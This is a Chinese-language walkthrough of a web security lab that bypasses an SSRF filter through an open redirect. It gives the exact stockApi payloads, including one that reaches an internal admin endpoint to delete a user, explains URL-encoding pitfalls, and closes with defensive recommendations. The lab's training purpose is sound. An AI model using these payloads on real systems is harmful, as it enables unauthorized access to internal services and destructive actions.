# 通过开放重定向绕过SSRF过滤

> 官方名：SSRF with filter bypass via open redirection vulnerability。核心：目标对 `stockApi` 做了限制，不能直接请求别的内网主机；但站点存在开放重定向，可以让 SSRF 请求先访问一个“允许的地址”，再通过 302 跳转到真正的内网目标。

## 知识点：SSRF + 开放重定向组合

### 正常 SSRF

```text
你 → 目标服务器 → stockApi 指定的 URL
```

如果目标直接限制了 `stockApi` 只能访问某些地址，直接改成内网 IP 会被拦截。

### 加入开放重定向

```text
你 → 目标服务器 → 允许访问的地址
                         ↓
                    302 Location
                         ↓
                 真正的内网管理接口
```

关键点是：

```text
服务器请求的不是最终目标
服务器请求的是一个看起来合法的跳转地址
```

如果这个跳转地址本身是应用允许访问的，过滤就会放行；但后续 302 会把请求带到内网管理接口。

## 知识点：`path` 参数的开放重定向

`/product/nextProduct` 这个接口会把 `path` 参数放到响应的 `Location` 头里：

```http
GET /product/nextProduct?path=http://192.168.0.12:8080/admin
```

响应类似：

```http
302 Found
Location: http://192.168.0.12:8080/admin
```

如果 HTTP 客户端自动跟随重定向，最终会访问：

```text
http://192.168.0.12:8080/admin
```

---

## 通关过程

1. 在产品页点击 **Check stock**，抓到 POST 请求：
   ```http
   POST /product/stock
   ```
   body 中有：
   ```text
   stockApi=...
   ```

2. 直接把 `stockApi` 改成内网地址会被拦截，说明存在过滤。

3. 点击 **Next product**，抓到：
   ```http
   GET /product/nextProduct?path=...
   ```
   观察 `path` 会被放进 `Location` 头，确认这是开放重定向点。

4. 构造一个利用开放重定向的 `stockApi`：
   ```text
   /product/nextProduct?path=http://192.168.0.12:8080/admin
   ```

5. 把这个值放进库存检查请求的 `stockApi` 中：
   ```http
   POST /product/stock

   stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
   ```

6. 服务器请求 `nextProduct`，收到 302，然后跟随重定向访问内网管理页面。

7. 把 `path` 改成删除用户的接口：
   ```text
   /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
   ```

8. 最终 `stockApi`：
   ```http
   stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
   ```

---

## 我踩过的坑：多写了 `currentProductId=1`

我一开始写成了：

```text
/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```

这会导致问题：

1. `&` 在 POST body 里是参数分隔符
2. `stockApi` 会被截断成：
   ```text
   /product/nextProduct?currentProductId=1
   ```
3. `path` 变成了另一个独立参数，不再属于 `stockApi`

如果想保留 `currentProductId`，必须把 `&` 编码成 `%26`：

```text
/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin
```

但这一关不需要 `currentProductId`，直接省略最简单：

```text
/product/nextProduct?path=http://192.168.0.12:8080/admin
```

---

## 易错点

### 1. 不要直接在浏览器访问 `/product/nextProduct`

那只是你自己跟着 302 跳，不是 SSRF。

正确做法是把 `/product/nextProduct?...` 作为 `stockApi` 的值，让服务器去请求它。

### 2. `stockApi` 是嵌套 URL，注意分隔符

在 POST body 中：

```text
& → %26
```

如果有 `?`、`=`，必要时也可以编码：

```text
? → %3F
= → %3D
```

编码不是必须每次都全量做，但**当嵌套 URL 的分隔符会被外层解析器吃掉时，必须编码**。

### 3. `http://` 不要少斜杠

错误：

```text
http:/192.168.0.12:8080
```

正确：

```text
http://192.168.0.12:8080
```

---

## 防御建议

- SSRF 校验不能只看初始 URL，还要禁止自动跟随重定向
- 如果必须跟随重定向，每一跳都要重新校验目标地址
- 出网请求使用白名单，而不是黑名单
- 禁止访问内网 IP、回环地址、云元数据地址
- 修复开放重定向，不要让 `path`、`url`、`next` 等参数直接进入 `Location`
- 跳转目标必须限制为本站白名单路径
- 服务端请求和内部管理面板应做网络隔离
